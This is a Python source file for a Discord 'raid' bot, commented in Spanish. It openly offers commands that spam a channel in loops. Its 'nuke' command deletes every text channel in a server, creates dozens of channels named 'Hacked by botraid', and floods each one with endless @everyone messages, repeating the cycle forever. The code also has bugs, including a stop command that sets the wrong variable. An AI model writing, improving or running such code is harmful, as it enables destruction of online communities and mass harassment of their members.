#by zvikodev
import pyfiglet
import asyncio
import discord 
from discord.ext import commands
#Activa todos los intents
text = pyfiglet.figlet_format("zVikoBot")
print(text)
intents = discord.Intents.all()
#Prefijo del bot
bot = commands.Bot(command_prefix=".", intents=intents)

#Da informacion si el bot arranca 
@bot.event
async def on_ready():
    print(f"Bot Encendido como {bot.user}")
    
@bot.command()
async def clear(ctx, amount: int = None):
    await ctx.channel.purge(limit=amount)
    await ctx.send(f"se han eliminado = {amount}", delete_after=3) 
    
@bot.command()
async def ayuda(ctx):
    embed = discord.Embed(
title="Menu hecho por zviko",
description="Use .kill (metodo .kill_speed o .kill_lento y pones lo que quieres enviar) y usa .kill stop_lento para detener y .kill stop_speed) use .nuke para hacer raid",
color = discord.Color.blue()
)
    await ctx.send(embed=embed)
@bot.command()
async def kill_speed(ctx, *, mensaje="error no hay mensaje"):
    global repetir_activo
    repetir_activo = True
    await ctx.send(f"Iniciando Nuke en 1 2 3 con el mensaje: '{mensaje}'", delete_after=3)
    while repetir_activo == True:
        await ctx.send(mensaje)
        await asyncio.sleep(0.2)

@bot.command()
async def stop_speed(ctx):
    global repetir_activo
    repetir_activo = False
    await ctx.send("se detuvo el ataque kill_spees")
#2
@bot.command()
async def kill_lento(ctx, *, mensaje):
    global repetir_activo1
    await ctx.send(f"Inciando ataque en 1,2,3 mensaje = '{mensaje}' ", delete_after=3)
    while repetir_activo1 == True:
        await ctx.send(mensaje)
        await asyncio.sleep(2)
@bot.command()
async def stop_lento(ctx):
    global repetir_archivo
    repetir_activo = False
    await ctx.send("se detuvo el ataque de kill_lento")         
#3


@bot.command()
async def nuke(ctx):
    if ctx.author.guild_permissions.manage_channels:
        await ctx.send("Iniciando eliminación y creación de múltiples canales con mensajes repetitivos...")

        while True:  # Bucle infinito
            # Eliminar todos los canales de texto
            for canal in ctx.guild.text_channels:
                try:
                    await canal.delete()  # Elimina el canal
                    print(f"Canal eliminado: {canal.name}")
                except Exception as e:
                    print(f"No se pudo eliminar el canal {canal.name}: {e}")

            # Lista con los nombres de los canales que quieres crear
            nombres_canales = ["Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid","Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid"]

            # Crear nuevos canales
            try:
                for nombre in nombres_canales:
                    nuevo_canal = await ctx.guild.create_text_channel(nombre)  # Crear canal con el nombre
                    print(f"Se creó el canal: {nombre}")

                    # Enviar mensajes repetitivos en el nuevo canal
                    async def enviar_mensajes(canal):
                        while True:
                            await canal.send("@everyone grupo hackeado por botraidv1")  # Mensaje repetitivo
                            await asyncio.sleep(0.1)  # Espera 5 segundos entre mensajes

                    asyncio.create_task(enviar_mensajes(nuevo_canal))  # Ejecutar el bucle de mensajes
            except Exception as e:
                print(f"No se pudieron crear los nuevos canales: {e}")

            await asyncio.sleep(600)  # Espera 30 segundos antes de repetir el ciclo
    else:
        await ctx.send("No tienes permisos suficientes para gestionar canales.")
bot.run('Token aqui')    
